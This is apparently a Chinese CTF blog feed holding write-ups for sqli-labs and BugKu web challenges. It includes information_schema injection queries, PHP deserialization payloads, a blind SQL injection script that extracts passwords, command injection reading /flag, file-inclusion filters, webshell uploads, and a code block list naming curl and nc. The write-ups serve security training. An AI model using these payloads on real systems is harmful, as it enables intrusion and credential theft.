class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h3><h4 id="手动注入-66"><a href="#手动注入-66" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p><h4 id="源码分析-45"><a href="#源码分析-45" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="常用方法总结"><a href="#常用方法总结" class="headerlink" title="常用方法总结"></a>常用方法总结</h2><h3 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h3><p>Mysql 有一个系统数据库<code>information_schema</code>，存储着所有的数据库的相关信息，一般的，我们利用该表可以进行一次完整的注入。以下为一般的流程。 </p><h4 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line">select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select xxxx from xxxxxx </span><br></pre></td></tr></table></figure><blockquote><p>上述知识参考用例：less1-less4</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录 4</title>
      <link href="/2022/05/05/BugKu-Web4/"/>
      <url>/2022/05/05/BugKu-Web4/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录-4"><a href="#BugKu-Web-刷题记录-4" class="headerlink" title="BugKu Web 刷题记录 4"></a>BugKu Web 刷题记录 4</h1><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/HelloCTF/p/13044403.html">ctf中的序列化和反序列化</a></p><p><a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p><a href="https://blog.csdn.net/plant1234/article/details/118033711">sql注入</a></p></blockquote><h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>添加<code>Referer</code>字段即可。</p><p><img src="https://s2.loli.net/2022/05/05/UEJoHjpm5KwqFAP.png" alt="where.png"></p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>根据提示得知是md5碰撞，故构造payload如下即可获得flag。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:14728/index.php?a=s878926199a</span><br></pre></td></tr></table></figure><h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>添加<code>client-ip</code>字段即可</p><p><img src="https://s2.loli.net/2022/05/05/mYO5zAiGuXM1skr.png" alt="clientip.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>访问<code>http://114.67.175.224:12650/flag.txt</code>得到<code>bugku</code>,然后构造payload即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:12650/?ac=bugku&amp;fn=flag.txt</span><br></pre></td></tr></table></figure><h2 id="安慰奖"><a href="#安慰奖" class="headerlink" title="安慰奖"></a>安慰奖</h2><p>F12查看源码，发现base64编码，解码后为<code>backups</code>，用dirsearch扫描一遍发现有bak文件，下载下来即可获得源码</p><p><img src="https://s2.loli.net/2022/05/05/esNlIwZaiT1OxQg.png" alt="anwei1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15293/?code=O:3:%22ctf%22:3:&#123;s:11:%22%00*%00username%22;s:5:%22admin%22;s:6:%22%00*%00cmd%22;s:12:%22tac%20flag.php%22;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>__wakeup 将在序列化之后立即被调用，绕过它仅需要将上面的对象属性个数值改得比真实对象大即可。</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>修改字段信息上传文件</p><p><img src="https://s2.loli.net/2022/05/05/QeUturNifLd75oY.png" alt="up1.png"></p><p>使用蚁剑连接，寻找flag</p><p><img src="https://s2.loli.net/2022/05/05/GU3BfPvWMe1Z7ns.png" alt="up2.png"></p><blockquote><p>参考：<a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p></blockquote><h2 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h2><p>解压后获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到里面是个加密函数，故构造解密函数即可，exp如下（注意提交的Flag形式）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>;  <span class="comment">//提示中的字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line"><span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// str = (data[i] + char[i])%128</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>((<span class="number">128</span> + <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decrypt</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>F12查看发现有upload.php，然后用burp进行文件上传</p><p><img src="https://s2.loli.net/2022/05/05/YtUdriGFB6R3D8b.png" alt="up2_1.png"></p><p>用蚁剑进行连接并寻找flag</p><p><img src="https://s2.loli.net/2022/05/05/eaqdkCrXstAuH2j.png" alt="up2_2.png"></p><p><img src="https://s2.loli.net/2022/05/05/GnvJHQrsBz1jAIh.png" alt="up2_3.png"></p><h2 id="需要管理员"><a href="#需要管理员" class="headerlink" title="需要管理员"></a>需要管理员</h2><p>用dirsearch扫一遍</p><p><img src="https://s2.loli.net/2022/05/05/IWOqanhjeZNlGHt.png" alt="admin1.png"></p><p>进入robots.txt</p><p><img src="https://s2.loli.net/2022/05/05/RBtlIYqK7mAHnME.png" alt="admin2.png"></p><p>进入resusl.php</p><p><img src="https://s2.loli.net/2022/05/05/OFGyhVxZXEdBCR3.png" alt="admin3.png"></p><p>观察页面发现需要输入密码，可以使用burpsuite爆破也可以根据题目名称猜测得到（密码是admin）</p><p><img src="https://s2.loli.net/2022/05/05/eKagOyH9o6IXpdF.png" alt="admin4.png"></p><h2 id="newphp"><a href="#newphp" class="headerlink" title="newphp"></a>newphp</h2><p>打开网页即可获得源码，根据源码构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/VqFjp2Qb4TcMxeA.png" alt="newphp1.png"></p><p>base64解码后得到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure><p>访问该页面</p><p><img src="https://s2.loli.net/2022/05/05/8TJwkz5a43SfoYn.png" alt="newphp2.png"></p><p>构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11918/index.cgi?name=%20file:////flag</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/qB5XHZveU3RwNgp.png" alt="newphp3.png"></p><blockquote><p>参考：<a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p></blockquote><h2 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h2><p>进入后查看网页源代码发现有<code>href=&quot;admin.css&quot;</code>，点进去后发现第一行有提示<code>/* try ?29614 */</code>，加入后缀后即可获得源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$KEY=&#x27;ctf.bugku.com&#x27;;</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie = $_COOKIE[&#x27;BUGKU&#x27;];</span><br><span class="line">if(isset($_GET[&#x27;29614&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>审计后发现构造序列化字符串使得其反序列化后与<code>$KEY</code>的值恒等即可</p><p><img src="https://s2.loli.net/2022/05/05/1WHcKEZJAsFgIVz.png" alt="login.png"></p><h2 id="都过滤了"><a href="#都过滤了" class="headerlink" title="都过滤了"></a>都过滤了</h2><p>登录界面的账号一栏可以被sql注入，编写脚本获取密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_data</span>(<span class="params">uname,data</span>):</span><br><span class="line">data[<span class="string">&#x27;uname&#x27;</span>] = uname</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">len_of_passwd</span>(<span class="params">url,data,cookie,uname</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;^(length(passwd)=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)^&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="comment">#print(&quot;密码的长度是&quot;+str(i))</span></span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_passwd</span>(<span class="params">url,data,cookie,uname,length</span>):</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;-(ascii(mid((passwd)from(&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)))=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(ch)) + <span class="string">&quot;)-&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">password += ch</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:11041/login.php&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;nnff401s86pvr720ouq5qe0k40&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">uname = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;uname&#x27;</span>:uname,</span><br><span class="line"><span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;123123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">length = len_of_passwd(url,data,cookie,uname)</span><br><span class="line">get_passwd(url,data,cookie,uname,length)</span><br><span class="line"><span class="comment">#bukuctf:4dcc88f8f1bc05e7c2ad1a60288481a2</span></span><br></pre></td></tr></table></figure><p>登陆后输入命令<code>&#123;cat,/flag&#125;</code>即可获得flag</p><blockquote><p>参考：<a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p></blockquote><h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><p>用burp抓包发现有tip字段,base64解码即可得到提示</p><p><img src="https://s2.loli.net/2022/05/05/hHV4OeurRwjZ1vM.png" alt="login2_1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造<code>username=admin&#39; union select 1,md5(123)#   </code>和<code>password=123</code>即可创建一个不存在的用户通过验证，进入后使用命令<code>123| cat /flag &gt; test</code>，然后进入网址<code>http://114.67.175.224:15394/test</code>即可获得flag。</p><p><img src="https://s2.loli.net/2022/05/05/wByZDhxQitfTlrg.png" alt="login2_2.png"></p><blockquote><p>参考：<a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p>还有反弹shell的做法：<a href="https://www.jianshu.com/p/4f8d8d8b7b31">https://www.jianshu.com/p/4f8d8d8b7b31</a></p></blockquote><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>盲猜账号<code>admin</code>和密码<code>bugkuctf</code>，然后直接拿到了flag。</p><blockquote><p>大佬的注入过程：<a href="https://blog.csdn.net/plant1234/article/details/118033711">sql注入</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录3</title>
      <link href="/2022/04/27/BugKu-Web3/"/>
      <url>/2022/04/27/BugKu-Web3/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录3"><a href="#BugKu-Web-刷题记录3" class="headerlink" title="BugKu Web 刷题记录3"></a>BugKu Web 刷题记录3</h1><blockquote><p>参考：</p><p><a href="https://www.php.net/exec">PHP程序执行</a></p><p><a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p><p><a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h2><p>一局游戏结束后，发现抓到了一个可疑的数据包</p><p><img src="https://s2.loli.net/2022/04/27/qpcmtIiEDoKwRuM.png" alt="game1_1.png"></p><p>猜测sign字段是base64加密的，但解码后发现是无用字符，又对score字段尝试base64加密，发现25的base64码是<code>MjU=</code>，故猜测sign字段本质上是不是<code>&#39;zM&#39;+&#39;base64_encode(score)&#39;+&#39;==&#39;</code>这样组成的，发送后发现确实可以得到flag</p><p><img src="https://s2.loli.net/2022/04/27/c5I9fRCyYVqFkwi.png" alt="game1_2.png"></p><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>先试试传入全局变量看看其中内容</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=$GLOBALS</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3mGOYDJhBH8264i.png" alt="eval1.png"></p><p>很好，被嘲讽了。eval会执行传入字符串，故构造payload让其执行命令</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=);show_source(&#x27;flag.php&#x27;);var_dump(</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/4u1rN5TXjQaVF63.png" alt="eval2.png"></p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>也可以直接使用file</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=file(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>扫描发现有git文件泄露，故下载git文件（linux下）</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> -r http://114.67.175.224:19331/.git</span><br></pre></td></tr></table></figure><p>进入日志目录下</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> <span class="number">114.67.175.224:19331</span>/.git/logs</span><br></pre></td></tr></table></figure><p>查看信息</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> reflog</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/9iGlevcpH3gEZjJ.png" alt="source1.png"></p><p>使用git show命令查看文件，最终在40c6d51文件里找到flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> show 40c6d51</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/jXeQsLpJgoF5ril.png" alt="source2.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h3><p>尝试查看源码</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>base64解码后获得源码和flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class="line">    